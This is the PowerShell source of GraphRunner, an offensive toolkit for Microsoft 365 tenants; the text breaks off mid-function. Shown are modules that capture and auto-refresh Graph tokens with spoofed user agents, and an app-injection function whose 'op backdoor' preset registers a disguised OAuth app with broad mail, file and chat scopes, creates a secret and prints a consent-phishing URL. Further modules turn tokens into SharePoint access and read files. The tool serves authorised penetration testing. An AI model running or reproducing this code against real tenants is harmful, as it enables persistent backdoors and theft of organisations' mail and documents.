Write-Host -ForegroundColor green "
  ________                     __      _______      by Beau Bullock (@dafthack)                                
 /_______/___________  ______ |  |____/_______\__ __  ____   ____   ___________ 
/___\  __\______\____\ \_____\|__|__\|________/__|__\/____\ /____\_/____\______\
\    \_\  \  | \// __ \|  |_/ |   Y  \    |   \  |  /   |  \   |  \  ___/|  | \/
 \________/__|  (______/__|   |___|__|____|___/____/|___|__/___|__/\___| >__|   
                 Do service principals dream of electric sheep?
                       
For usage information see the wiki here: https://github.com/dafthack/GraphRunner/wiki
To list GraphRunner modules run List-GraphRunnerModules
"


function Get-GraphTokens{
    <#
        .SYNOPSIS
        Get-GraphTokens is the main user authentication module for GraphRunner. Upon authenticating it will store your tokens in the global $tokens variable as well as the tenant ID in $tenantid. To use them with other GraphRunner modules use the Tokens flag (Example. Invoke-DumpApps -Tokens $tokens)
        Author: Beau Bullock (@dafthack)
        License: MIT
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION
        
       Get-GraphTokens is the main user authentication module for GraphRunner. Upon authenticating it will store your tokens in the global $tokens variable as well as the tenant ID in $tenantid. To use them with other GraphRunner modules use the Tokens flag (Example. Invoke-DumpApps -Tokens $tokens)     
    
    .PARAMETER UserPasswordAuth
        
        Provide a username and password for authentication instead of using a device code auth.
    
    .PARAMETER Client
        
        Provide a Client to authenticate to. Use Custom to provide your own ClientID.

    .PARAMETER ClientID
        
        Provide a ClientID to use with the Custom client option.

    .PARAMETER Resource

        Provide a resource to authenticate to such as https://graph.microsoft.com/

    .PARAMETER Device
        
        Provide a device type to use such as Windows or Android.

    .PARAMETER Browser
        
        Provide a Browser to spoof.
    


    .EXAMPLE
        
        C:\PS> Get-GraphTokens
        Description
        -----------
        This command will initiate a device code auth where you can authenticate the terminal from an already authenticated browser session.
     #>
    [CmdletBinding()]
    param(
    [Parameter(Position = 0,Mandatory=$False)]
    [switch]$ExternalCall,
    [Parameter(Position = 1,Mandatory=$False)]
    [switch]$UserPasswordAuth,
    [Parameter(Position = 2,Mandatory=$False)]
    [ValidateSet("Yammer","Outlook","MSTeams","Graph","AzureCoreManagement","AzureManagement","MSGraph","DODMSGraph","Custom","Substrate")]
    [String[]]$Client = "MSGraph",
    [Parameter(Position = 3,Mandatory=$False)]
    [String]$ClientID = "d3590ed6-52b3-4102-aeff-aad2292ab01c",    
    [Parameter(Position = 4,Mandatory=$False)]
    [String]$Resource = "https://graph.microsoft.com",
    [Parameter(Position = 5,Mandatory=$False)]
    [ValidateSet('Mac','Windows','AndroidMobile','iPhone')]
    [String]$Device,
    [Parameter(Position = 6,Mandatory=$False)]
    [ValidateSet('Android','IE','Chrome','Firefox','Edge','Safari')]
    [String]$Browser
    )
    if ($Device) {
		if ($Browser) {
			$UserAgent = Invoke-ForgeUserAgent -Device $Device -Browser $Browser
		}
		else {
			$UserAgent = Invoke-ForgeUserAgent -Device $Device
		}
	}
	else {
	   if ($Browser) {
			$UserAgent = Invoke-ForgeUserAgent -Browser $Browser 
	   } 
	   else {
			$UserAgent = Invoke-ForgeUserAgent
	   }
	}
    if($UserPasswordAuth){
        Write-Host -ForegroundColor Yellow "[*] Initiating the User/Password authentication flow"
        $username = Read-Host -Prompt "Enter username"
        $password = Read-Host -Prompt "Enter password" -AsSecureString

        $passwordText = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($password))

        $url = "https://login.microsoft.com/common/oauth2/token"
        $headers = @{
            "Accept" = "application/json"
            "Content-Type" = "application/x-www-form-urlencoded"
            "User-Agent" = $UserAgent
        }
        $body = "grant_type=password&password=$passwordText&client_id=$ClientID&username=$username&resource=$Resource&client_info=1&scope=openid"


        try{
            Write-Host -ForegroundColor Yellow "[*] Trying to authenticate with the provided credentials"
            $tokens = Invoke-RestMethod -Uri $url -Method Post -Headers $headers -Body $body

            if ($tokens) {
                $tokenPayload = $tokens.access_token.Split(".")[1].Replace('-', '+').Replace('_', '/')
                while ($tokenPayload.Length % 4) { Write-Verbose "Invalid length for a Base-64 char array or string, adding ="; $tokenPayload += "=" }
                $tokenByteArray = [System.Convert]::FromBase64String($tokenPayload)
                $tokenArray = [System.Text.Encoding]::ASCII.GetString($tokenByteArray)
                $tokobj = $tokenArray | ConvertFrom-Json
                $global:tenantid = $tokobj.tid
                Write-Output "Decoded JWT payload:"
                $tokobj
                Write-Host -ForegroundColor Green '[*] Successful authentication. Access and refresh tokens have been written to the global $tokens variable. To use them with other GraphRunner modules use the Tokens flag (Example. Invoke-DumpApps -Tokens $tokens)'
                $baseDate = Get-Date -date "01-01-1970"
                $tokenExpire = $baseDate.AddSeconds($tokobj.exp).ToLocalTime()
                Write-Host -ForegroundColor Yellow "[!] Your access token is set to expire on: $tokenExpire"
            }
        } catch {
            $details = $_.ErrorDetails.Message | ConvertFrom-Json
            Write-Output $details.error
        }
        $global:tokens = $tokens
        if($ExternalCall){
            return $tokens
        }
    
    }
    else{
        If($tokens){
            $newtokens = $null
            while($newtokens -notlike "Yes"){
                Write-Host -ForegroundColor cyan "[*] It looks like you already tokens set in your `$tokens variable. Are you sure you want to authenticate again?"
                $answer = Read-Host 
                $answer = $answer.ToLower()
                if ($answer -eq "yes" -or $answer -eq "y") {
                    Write-Host -ForegroundColor yellow "[*] Initiating device code login..."
                    $global:tokens = ""
                    $newtokens = "Yes"
                } elseif ($answer -eq "no" -or $answer -eq "n") {
                    Write-Host -ForegroundColor Yellow "[*] Quitting..."
                    return
                } else {
                    Write-Host -ForegroundColor red "Invalid input. Please enter Yes or No."
                }
            }
        }

        $body = @{
            "client_id" =     $ClientID
            "resource" =      $Resource
        }
        $Headers=@{}
        $Headers["User-Agent"] = $UserAgent
        $authResponse = Invoke-RestMethod `
            -UseBasicParsing `
            -Method Post `
            -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" `
            -Headers $Headers `
            -Body $body
        Write-Host -ForegroundColor yellow $authResponse.Message

        $continue = "authorization_pending"
        while ($continue) {
            $body = @{
                "client_id"   = $ClientID
                "grant_type"  = "urn:ietf:params:oauth:grant-type:device_code"
                "code"        = $authResponse.device_code
                "scope"       = "openid"
            }

            try {
                $tokens = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0" -Headers $Headers -Body $body

                if ($tokens) {
                    $tokenPayload = $tokens.access_token.Split(".")[1].Replace('-', '+').Replace('_', '/')
                    while ($tokenPayload.Length % 4) { Write-Verbose "Invalid length for a Base-64 char array or string, adding ="; $tokenPayload += "=" }
                    $tokenByteArray = [System.Convert]::FromBase64String($tokenPayload)
                    $tokenArray = [System.Text.Encoding]::ASCII.GetString($tokenByteArray)
                    $tokobj = $tokenArray | ConvertFrom-Json
                    $global:tenantid = $tokobj.tid
                    Write-Output "Decoded JWT payload:"
                    $tokobj
                    $baseDate = Get-Date -date "01-01-1970"
                    $tokenExpire = $baseDate.AddSeconds($tokobj.exp).ToLocalTime()
                    Write-Host -ForegroundColor Green '[*] Successful authentication. Access and refresh tokens have been written to the global $tokens variable. To use them with other GraphRunner modules use the Tokens flag (Example. Invoke-DumpApps -Tokens $tokens)'
                    Write-Host -ForegroundColor Yellow "[!] Your access token is set to expire on: $tokenExpire"
                    $continue = $null
                }
            } catch {
                $details = $_.ErrorDetails.Message | ConvertFrom-Json
                $continue = $details.error -eq "authorization_pending"
                Write-Output $details.error
            }

            if ($continue) {
                Start-Sleep -Seconds 3
            }
            else{
                $global:tokens = $tokens
                if($ExternalCall){
                    return $tokens
                }
            }
        }
    }
}
function Invoke-AutoTokenRefresh{
    <#
        .SYNOPSIS
        Continuously refresh tokens at an interval.
        Author: Steve Borosh (@424f424f)
        License: MIT
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION
        
       This module will refresh a Microsoft ID token at specified intervals.
    
    .PARAMETER RefreshToken
        
        Supply a refresh token to re-authenticate.

    .PARAMETER tenantid
        
        Supply a tenant domain or ID to authenticate to.

    .PARAMETER RefreshInterval
        
        Supply an interval in minutes to refresh the token. Default 5 minutes.
    
    .PARAMETER InitializationDelay

        Supply a delay before starting to refresh in minutes. Devault is 0.
    
    .PARAMETER OutFile
        
        Supply file name to save to. This will overwrite the current file.

    .EXAMPLE
        
        C:\PS> Invoke-AutoTokenRefresh - RefreshToken "0.A.." -tenantid "company.com" -Outfile .\access_token.txt
        Description
        -----------
        This command will use the refresh token to aquire a new access_token, save it to the $tokens variable and to the Outfile.
    

    #>
    [cmdletbinding()]
    Param(
    [Parameter(Mandatory = $True)]
    [string]
    $RefreshToken,
    [Parameter(Mandatory = $True)]
    [string]
    $tenantid,
    [Parameter(Mandatory = $False)]
    $RefreshInterval =  5,
    [Parameter(Mandatory = $False)]
    $InitializationDelay = 0,
    [Parameter(Mandatory = $False)]
    [switch]
    $DisplayToken,
    [Parameter(Mandatory = $False)]
    [string]
    $Outfile
    )
    if($InitializationDelay){
        Start-Sleep -Seconds (60 * $InitializationDelay)
    }

    while($true){ 
        if(!$RefreshToken){
            write-host -ForegroundColor red '[*] A refresh token is required.'
            break
        } elseif (!$tenantid){
            write-host -ForegroundColor red '[*] The tenant id or domain is required.'
        }
        Write-Host -ForegroundColor yellow "[*] Refreshing Tokens..."
        $authUrl = "https://login.microsoftonline.com/$tenantid"
        $refreshbody = @{
                "resource" = "https://graph.microsoft.com/"
                "client_id" =     "d3590ed6-52b3-4102-aeff-aad2292ab01c"
                "grant_type" =    "refresh_token"
                "refresh_token" = $RefreshToken
                "scope"=         "openid"
            }
        $UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
        $Headers=@{}
        $Headers["User-Agent"] = $UserAgent
        try {
            $reftokens = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "$($authUrl)/oauth2/token" -Headers $Headers -Body $refreshbody
        }
        catch {
            $details=$_.ErrorDetails.Message | ConvertFrom-Json
            Write-Output $details.error
        } 
        if($reftokens)
            {
                $global:tokens = $reftokens
                $tokenPayload = $tokens.access_token.Split(".")[1].Replace('-', '+').Replace('_', '/')
                while ($tokenPayload.Length % 4) { Write-Verbose "Invalid length for a Base-64 char array or string, adding ="; $tokenPayload += "=" }
                $tokenByteArray = [System.Convert]::FromBase64String($tokenPayload)
                $tokenArray = [System.Text.Encoding]::ASCII.GetString($tokenByteArray)
                $tokobj = $tokenArray | ConvertFrom-Json
                $global:tenantid = $tokobj.tid
                Write-host "Decoded JWT payload:"
                $tokobj
                $global:tokens.access_token | Out-File -encoding ascii -FilePath $Outfile
                Write-Host -ForegroundColor Green '[*] Successful authentication. Access and refresh tokens have been written to the global $access_token variable. To use them with other GraphRunner modules use the Tokens flag (Example. Invoke-DumpApps -Tokens $tokens)'
                $baseDate = Get-Date -date "01-01-1970"
                $tokenExpire = $baseDate.AddSeconds($tokobj.exp).ToLocalTime()
                Write-Host -ForegroundColor Yellow "[!] Your access token is set to expire on: $tokenExpire"
                if($DisplayToken){
                    Write-Host "[*] Your access token is:"
                    Write-Host $global:tokens.access_token
                }
                Start-Sleep -Seconds (60 * $RefreshInterval)
            }
        } 
}

function Invoke-RefreshGraphTokens {
    <#
    .SYNOPSIS
    Access tokens typically have an expiration time of one hour, so it will be necessary to refresh them occasionally. If you have already run the Get-GraphTokens command, your refresh tokens will be utilized when you run Invoke-RefreshGraphTokens to obtain a new set of tokens.
    Author: Beau Bullock (@dafthack)
    License: MIT
    Required Dependencies: None
    Optional Dependencies: None
    .DESCRIPTION
    Access tokens typically have an expiration time of one hour, so it will be necessary to refresh them occasionally. If you have already run the Get-GraphTokens command, your refresh tokens will be utilized when you run Invoke-RefreshGraphTokens to obtain a new set of tokens.
    .PARAMETER RefreshToken
    Supply a refresh token to re-authenticate.
    .PARAMETER tenantid
    Supply a tenant domain or ID to authenticate to.
    .PARAMETER Client
    Provide a Client to authenticate to. Use Custom to provide your own ClientID.
    .PARAMETER ClientID
    Provide a ClientID to use with the Custom client option.
    .PARAMETER Resource
    Provide a resource to authenticate to such as https://graph.microsoft.com/
    .PARAMETER Device
    Provide a device type to use such as Windows or Android.
    .PARAMETER Browser
    Provide a Browser to spoof.
    .PARAMETER AutoRefresh
    If this switch is enabled, it will skip the 'break' statement, allowing for automatic token refresh.
    #>
    [cmdletbinding()]
    Param (
        [Parameter(Mandatory = $False)]
        [string]
        $RefreshToken,
        [Parameter(Mandatory = $False)]
        [string]
        $tenantid = $global:tenantid,
        [Parameter(Mandatory = $False)]
        [ValidateSet("Yammer", "Outlook", "MSTeams", "Graph", "AzureCoreManagement", "AzureManagement", "MSGraph", "DODMSGraph", "Custom", "Substrate")]
        [String[]]$Client = "MSGraph",
        [Parameter(Mandatory = $False)]
        [String]
        $ClientID = "d3590ed6-52b3-4102-aeff-aad2292ab01c",
        [Parameter(Mandatory = $False)]
        [String]
        $Resource = "https://graph.microsoft.com",
        [Parameter(Mandatory = $False)]
        [ValidateSet('Mac', 'Windows', 'AndroidMobile', 'iPhone')]
        [String]
        $Device,
        [Parameter(Mandatory = $False)]
        [ValidateSet('Android', 'IE', 'Chrome', 'Firefox', 'Edge', 'Safari')]
        [String]
        $Browser,
        [switch]
        $AutoRefresh
    )

    if ($Device) {
        if ($Browser) {
            $UserAgent = Invoke-ForgeUserAgent -Device $Device -Browser $Browser
        } else {
            $UserAgent = Invoke-ForgeUserAgent -Device $Device
        }
    } else {
        if ($Browser) {
            $UserAgent = Invoke-ForgeUserAgent -Browser $Browser
        } else {
            $UserAgent = Invoke-ForgeUserAgent
        }
    }

    if (!$RefreshToken) {
        if (!$tokens) {
            Write-Host -ForegroundColor red '[*] No tokens found in the $tokens variable. Use the Get-GraphTokens module to authenticate first.'
            break
        } else {
            $RefreshToken = $tokens.refresh_token
        }
    }

    Write-Host -ForegroundColor yellow "[*] Refreshing Tokens..."
    $authUrl = "https://login.microsoftonline.com/$tenantid"
    $refreshbody = @{
        "resource" = "https://graph.microsoft.com/"
        "client_id" = $ClientID
        "grant_type" = "refresh_token"
        "refresh_token" = $RefreshToken
        "scope" = "openid"
    }
    $Headers = @{}
    $Headers["User-Agent"] = $UserAgent

    try {
        $reftokens = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "$($authUrl)/oauth2/token" -Headers $Headers -Body $refreshbody
    } catch {
        $errorMessage = $_.Exception.Message
        Write-Output "Error refreshing tokens: $errorMessage"
        return
    }

    if ($reftokens) {
        $global:tokens = $reftokens
        $tokenPayload = $reftokens.access_token.Split(".")[1].Replace('-', '+').Replace('_', '/')
        while ($tokenPayload.Length % 4) { Write-Verbose "Invalid length for a Base-64 char array or string, adding ="; $tokenPayload += "=" }
        $tokenByteArray = [System.Convert]::FromBase64String($tokenPayload)
        $tokenArray = [System.Text.Encoding]::ASCII.GetString($tokenByteArray)
        $tokobj = $tokenArray | ConvertFrom-Json
        $global:tenantid = $tokobj.tid
        if(!$AutoRefresh){
            Write-host "Decoded JWT payload:"
            $tokobj
            Write-Host -ForegroundColor Green '[*] Successful authentication. Access and refresh tokens have been written to the global $tokens variable. To use them with other GraphRunner modules use the Tokens flag (Example. Invoke-DumpApps -Tokens $tokens)'
        }
        $baseDate = Get-Date -date "01-01-1970"
        $tokenExpire = $baseDate.AddSeconds($tokobj.exp).ToLocalTime()
        Write-Host -ForegroundColor Yellow "[!] Your access token is set to expire on: $tokenExpire"
        if (-not $AutoRefresh) {
            break
        }
        return $reftokens
    }
}


function Invoke-InjectOAuthApp{


<#
    .SYNOPSIS
        This is a CLI tool for automating the deployment of an app registration to a Microsoft Azure tenant. In the event that the Azure portal is locked down this may provide an additional mechanism for app deployment, provided that user's are allowed to register apps in the tenant.
        Author: Beau Bullock (@dafthack)
        License: MIT
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION
        
       This is a CLI tool for automating the deployment of an app registration to a Microsoft Azure tenant. In the event that the Azure portal is locked down this may provide an additional mechanism for app deployment, provided that user's are allowed to register apps in the tenant.        
    
    .PARAMETER AppName
        
        The display name of the App Registration. This is what will be displayed on the consent page.
    
    .PARAMETER ReplyUrl
        
        The reply URL to redirect a user to after app consent. This is where you will want to capture the OAuth code and complete the flow to obtain an access token and refresh token.
    
    .PARAMETER Scope
        
        Delegated Microsoft Graph permissions to scope to the app. Example: Mail.Read, User.ReadBasic.All, etc. Scope items need to be comma separated with each item in double quotes like this (-scope "Mail.Read","openid","email","profile","offline_access")
    
     .PARAMETER Tokens
        
        Provide an already authenticated access token. 

    .EXAMPLE
        
        C:\PS> Invoke-InjectOAuthApp -AppName "Win Defend for M365" -ReplyUrl "https://windefend.azurewebsites.net" -scope "openid","Mail.Read","email","profile","offline_access"
        Description
        -----------
        This command will inject an app registration with the display name of "Win Defend for M365" with a scope of openid, Mail.Read, email, profile, and offline_access
    
    .EXAMPLE
        
        C:\PS> Invoke-InjectOAuthApp -AppName "Not a Backdoor" -ReplyUrl "http://localhost:10000" -scope "op backdoor" -Tokens $tokens
        Description
        -----------
        This command takes an already authenticated access token gathered from something like a device code login. It uses the hardcoded value of "op backdoor" as the scope to add a large number of permissions to the app registration. None of these permissions require admin consent. Also, by specifying the reply url as running on localhost you can use the Invoke-AutoOAuthFlow module to spin up a web server on the localhost for capturing the auth code during consent flow.
#>
  Param(


    [Parameter(Position = 0, Mandatory = $True)]
    [string]
    $AppName = "",

    [Parameter(Position = 1, Mandatory = $True)]
    [string]
    $ReplyUrl = "",

    [Parameter(Position = 2, Mandatory = $True)]
    [string[]]
    $Scope,
    
    [Parameter(Position = 3, Mandatory = $False)]
    [object[]]
    $Tokens
  )
    if($Tokens){
        Write-Host -ForegroundColor yellow "[*] Using the provided access tokens."
    }
    else{
         # Login
         Write-Host -ForegroundColor yellow "[*] First, you need to login as the user you want to deploy the app as." 
         Write-Host -ForegroundColor yellow "[*] If you already have tokens you can use the -Tokens parameter to pass them to this function."
         while($auth -notlike "Yes"){
                Write-Host -ForegroundColor cyan "[*] Do you want to authenticate now (yes/no)?"
                $answer = Read-Host 
                $answer = $answer.ToLower()
                if ($answer -eq "yes" -or $answer -eq "y") {
                    Write-Host -ForegroundColor yellow "[*] Running Get-GraphTokens now..."
                    $tokens = Get-GraphTokens -ExternalCall
                    $auth = "Yes"
                } elseif ($answer -eq "no" -or $answer -eq "n") {
                    Write-Host -ForegroundColor Yellow "[*] Quitting..."
                    return
                } else {
                    Write-Host -ForegroundColor red "Invalid input. Please enter Yes or No."
                }
            }
    }
    $access_token = $tokens.access_token        
    $Headers = @{
        Authorization = "Bearer $access_token"
    }

    # Get Microsoft Graph Object ID
    Write-Host -ForegroundColor yellow "[*] Getting Microsoft Graph Object ID"


    # Get full service principal list

    $initialUrl = "https://graph.microsoft.com/v1.0/servicePrincipals"
    $headers = @{"Authorization" = "Bearer $access_token"}

    # Initialize an array to store all collected data
    $allData = @()

    # Loop until there's no more nextLink
    do {
        # Invoke the web request
        try{
            $response = Invoke-WebRequest -UseBasicParsing -Uri $initialUrl -Headers $headers
        }catch{
            Write-Host -ForegroundColor Red "[*] Something went wrong."
            return
        }
        # Convert the response content to JSON
        $jsonData = $response.Content | ConvertFrom-Json

        # Add the current page's data to the array
        $allData += $jsonData.value

        # Check if there's a nextLink
        if ($jsonData.'@odata.nextLink') {
            $initialUrl = $jsonData.'@odata.nextLink'
        } 
        else { 
            break
        }
    } while ($true)

    $appDisplayNameToSearch = "Microsoft Graph"
    $graphId = $allData | Where-Object { $_.appDisplayName -eq $appDisplayNameToSearch } | Select-Object -ExpandProperty appId
    $graphIdInternal = $allData | Where-Object { $_.appDisplayName -eq $appDisplayNameToSearch } | Select-Object -ExpandProperty Id
    Write-Output "Graph ID: $graphId"
    Write-Output "Internal Graph ID: $graphIdInternal"

    # Get Object IDs of individual permissions
    Write-Host -ForegroundColor yellow "[*] Now getting object IDs for scope objects:"
    $spns = Invoke-WebRequest -UseBasicParsing -Uri "https://graph.microsoft.com/v1.0/servicePrincipals/$graphIdInternal" -Headers $headers
    $spnsjson = $spns.Content | ConvertFrom-Json

    if ($Scope -like "op backdoor")
    {
        $Scope = "openid","profile","offline_access","email","User.Read","User.ReadBasic.All","Mail.Read","Mail.Send","Mail.Read.Shared","Mail.Send.Shared","Files.ReadWrite.All","EWS.AccessAsUser.All","ChatMessage.Read","ChatMessage.Send","Chat.ReadWrite","Chat.Create","ChannelMessage.Edit","ChannelMessage.Send","Channel.ReadBasic.All","Presence.Read.All","Team.ReadBasic.All","Team.Create","Sites.Manage.All","Sites.Read.All","Sites.ReadWrite.All","Policy.Read.ConditionalAccess"
        Write-Host -ForegroundColor yellow "[*] One overpowered (OP) backdoor is coming right up! Here is the scope:"
    }
    elseif ($Scope -like "mail reader")
    {
        $Scope = "openid","profile","offline_access","email","User.Read","Mail.Read","Mail.Read.Shared"
        Write-Host -ForegroundColor yellow "[*] One overpowered (OP) backdoor is coming right up! Here is the scope:"
    }
    $scopeurl = ""
    $accesslist = ""
    $scopeIds = @{}
    $joinedScope = $Scope -join " "
    $joinedScope

    # Loop through each item in $Scope
    foreach ($item in $Scope){
        $variableName = $item -replace "[\W\d]", ""  # Remove non-alphanumeric characters and digits
        $variableName = $variableName + "Scope"
    

        $scopeItem = $spnsjson.oauth2PermissionScopes | Where-Object { $_.value -eq "$item" } |select-object id
        $scopeId = ('"' + $scopeItem.Id +'"')
        if (!$scopeId){Write-host -foregroundcolor red "[**] Couldn't find scope option $item"}
        else{
        Write-Host ($item + " : " + $scopeId)
        $scopeurl += "$item%20"
        $accesslist += '{"id": ' + $scopeId + ',"type": "Scope"},'
    
        # Store the scope ID in the hashtable
        $scopeIds[$variableName] = $scopeId
        }
    }

    Write-Host -ForegroundColor yellow "[*] Finished collecting object IDs of permissions."
    # Create a resources variable
    $permissions = $accesslist.Trim(",")

$resources = @"
{"resourceAppId": "$graphId", "resourceAccess": [$permissions]}
"@

    # Create the app in the tenant
    Write-host -ForegroundColor yellow "[*] Now deploying the app registration with display name $AppName to the tenant."

    $resourceAccess = $resources | ConvertFrom-Json

    # Construct the JSON body
    $jsonBody = @{
        displayName         = $AppName
        signInAudience      = "AzureADMultipleOrgs"
        keyCredentials      = @()
        web                 = @{
            redirectUris = @($ReplyUrl)
        }
        requiredResourceAccess = @(
            @{
                resourceAppId   = $resourceAccess.resourceAppId
                resourceAccess = $resourceAccess.resourceAccess
            }
        )
    }

    # Convert the JSON body to a properly formatted JSON string
    $finalJson = $jsonBody | ConvertTo-Json -Depth 10

    $appcreationheaders = @{
        Authorization = "Bearer $access_token"
        "Content-Type" = "application/json"
        "Accept-Encoding" = "gzip, deflate"
    }


    $appresponse = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/applications" -Headers $appcreationheaders  -Method Post -Body $finaljson

    if (!$appresponse){
        Write-host -ForegroundColor red "[*] An error occurred during deployment."
        break
    }

    $currentTime = Get-Date -Format "yyyy-MM-ddTHH:mm:ssZ"
    $oneYearLater = (Get-Date).AddYears(1).ToString("yyyy-MM-ddTHH:mm:ssZ")
    $secretCredential = @{
        passwordCredential = @{
            displayName = $null
            endDateTime = $oneYearLater
            startDateTime = $currentTime
        }
    }
    $SecretBody = $secretCredential | ConvertTo-Json
    $applicationid = $appresponse.id
    $secretrequest = Invoke-WebRequest -UseBasicParsing -Headers $Headers -Method POST -ContentType "application/json" -Body $SecretBody -Uri "https://graph.microsoft.com/v1.0/applications/$applicationid/addPassword"

    $secretdata = $secretrequest.Content |ConvertFrom-json

    # Generate the Consent URL
    Write-host -ForegroundColor yellow "[*] If everything worked successfully this is the consent URL you can use to grant consent to the app:"
    $consentURL = "https://login.microsoftonline.com/organizations/oauth2/v2.0/authorize?client_id=" + $appresponse.AppId + "&response_type=code&redirect_uri=" + [System.Web.HttpUtility]::UrlEncode($ReplyUrl) + "&response_mode=query&scope=" + $scopeurl.Trim("%20") + "&state=1234"
    Write-Host "--------------------------------------------------------"
    Write-Host -ForegroundColor green $consentURL
    Write-Host "--------------------------------------------------------"
    Write-Host ("Application ID: " + $appresponse.AppId)
    Write-Host ("Object ID: " + $appresponse.Id)
    Write-Host ("Secret: " + $Secretdata.secretText)
    Write-Host "--------------------------------------------------------"

    if($ReplyUrl -match "localhost" -or $ReplyUrl -match "127.0.0.1"){
    Write-Host "Localhost detected in Reply URL field. You can use the Invoke-AutoOAuthFlow module to complete the OAuth flow automatically."
    Write-Host "--------------------------------------------------------"
    $scopeclean = ('"' + $scopeurl.replace('%20', ' ').Trim(" ") + '"')
    Write-Host -ForegroundColor Cyan ('Invoke-AutoOAuthFlow -ClientId "' + $appresponse.AppId + '" -ClientSecret "' + $Secretdata.secretText + '" -RedirectUri "' + $ReplyURL + '" -scope ' + $scopeclean)
    }
    else{
    Write-Host "After you obtain an OAuth Code from the redirect URI server you can use this command to complete the flow:"
    Write-Host "--------------------------------------------------------"
    $scopeclean = ('"' + $scopeurl.replace('%20', ' ').Trim(" ") + '"')
    Write-Host -ForegroundColor Cyan ('Get-AzureAppTokens -ClientId "' + $appresponse.AppId + '" -ClientSecret "' + $Secretdata.secretText + '" -RedirectUri "' + $ReplyURL + '" -scope ' + $scopeclean + " -AuthCode <insert your OAuth Code here>")
    }
}

function Invoke-RefreshToSharePointToken {
    <#
    .DESCRIPTION
        Generate a SharePoint token from a refresh token.
    .EXAMPLE
        Invoke-RefreshToSharePointToken -domain myclient.org -refreshToken ey....
        $SharePointToken.access_token
    #>

    [cmdletbinding()]
    Param([Parameter(Mandatory=$false)]
    [string]$domain,
    [Parameter(Mandatory=$false)]
    [String]$ClientId = "d3590ed6-52b3-4102-aeff-aad2292ab01c",
    [Parameter(Position = 3, Mandatory = $True)]
    [object[]]
    $Tokens,
    [Parameter(Mandatory=$False)]
    [ValidateSet('Mac','Windows','AndroidMobile','iPhone')]
    [String]$Device,
    [Parameter(Mandatory=$False)]
    [ValidateSet('Android','IE','Chrome','Firefox','Edge','Safari')]
    [String]$Browser
    )
    if ($Device) {
		if ($Browser) {
			$UserAgent = Invoke-ForgeUserAgent -Device $Device -Browser $Browser
		}
		else {
			$UserAgent = Invoke-ForgeUserAgent -Device $Device
		}
	}
	else {
	   if ($Browser) {
			$UserAgent = Invoke-ForgeUserAgent -Browser $Browser 
	   } 
	   else {
			$UserAgent = Invoke-ForgeUserAgent
	   }
	}
    $Headers=@{}
    $Headers["User-Agent"] = $UserAgent
    $Resource = "https://$($domain)/"
    $authUrl = "https://login.microsoftonline.com/$($global:tenantid)"
    $refreshToken = $tokens.refresh_token
    $body = @{
        "resource" =      $Resource
        "client_id" =     $ClientId
        "grant_type" =    "refresh_token"
        "refresh_token" = $refreshToken
        "scope" = "openid"
    }

    $global:SharePointToken = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "$($authUrl)/oauth2/token?api-version=1.0" -Headers $Headers -Body $body

}

function Invoke-ImmersiveFileReader{
    <#
     .SYNOPSIS
        Simple module to read a file with the immersive reader.
        Author: Steve Borosh (@424f424f)
        License: MIT
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION
        
       Simple module to read a file with the immersive reader.

    .PARAMETER SharePointDomain

        The target SharePoint domain. e.g. targetcompany.sharepoint.com
    
    .PARAMETER DriveID

        The DriveID.

    .PARAMETER FileID

        The ID of the file to open.
    
    .EXAMPLE
        
        C:\PS> Invoke-ImmersiveFileReader -SharePointDomain targetcompany.sharepoint.com -DriveID <drive ID> -FileID <FileID>
        Description
        -----------
        This command use the immersive reader to read a file.

    #>

    param(
        [Parameter(Position = 1, Mandatory = $True)]
        [string]
        $SharePointDomain,
        [Parameter(Mandatory = $True)]
        [string]
        $DriveID,
        [Parameter(Mandatory = $True)]
        [string]
        $FileID,
        [Parameter(Mandatory = $False)]
        [object[]]
        $Tokens
    )
    if ($Device) {
        if ($Browser) {
            $UserAgent = Invoke-ForgeUserAgent -Device $Device -Browser $Browser
        }
        else {
            $UserAgent = Invoke-ForgeUserAgent -Device $Device
        }
    }
    else {
        if ($Browser) {
            $UserAgent = Invoke-ForgeUserAgent -Browser $Browser 
        } 
        else {
            $UserAgent = Invoke-ForgeUserAgent
        }
    }
    if($Tokens){
        Write-Host -ForegroundColor yellow "[*] Using the provided access tokens."
    }
    else{
         # Login
         Write-Host -ForegroundColor yellow "[*] First, you need to login." 
         Write-Host -ForegroundColor yellow "[*] If you already have tokens you can use the -Tokens parameter to pass them to this function."
         while($auth -notlike "Yes"){
                Write-Host -ForegroundColor cyan "[*] Do you want to authenticate now (yes/no)?"
                $answer = Read-Host 
                $answer = $answer.ToLower()
                if ($answer -eq "yes" -or $answer -eq "y") {
                    Write-Host -ForegroundColor yellow "[*] Running Get-GraphTokens now..."
                    $tokens = Get-GraphTokens -ExternalCall
                    $auth = "Yes"
                } elseif ($answer -eq "no" -or $answer -eq "n") {
                    Write-Host -ForegroundColor Yellow "[*] Quitting..."
                    return
                } else {
                    Write-Host -ForegroundColor red "Invalid input. Please enter Yes or No."
                }
            }
    }

    $Headers=@{}
    $Headers["User-Agent"] = $UserAgent
    $Headers["Host"] = 'southcentralus1-mediap.svc.ms'
    $Headers["Accept-Language"] = "en-US"
    
    Invoke-RefreshToSharePointToken -domain $SharePointDomain -ClientId "d326c1ce-6cc6-4de2-bebc-4591e5e13ef0" -Tokens $tokens
   
    try {
        $request = Invoke-WebRequest -UseBasicParsing -Headers $Headers -Method GET -Uri "https://southcentralus1-mediap.svc.ms/transform/imreader?provider=spo&inputFormat=txt&cs=fFNQTw&docid=https%3A%2F%2F$($SharePointDomain)%3A443%2F_api%2Fv2.0%2Fdrives%2F$($DriveID)%2Fitems%2F$($FileID)%3Fversion%3DPublished&access_token=$($global:SharePointToken.access_token)&nocache=true"
        }catch{
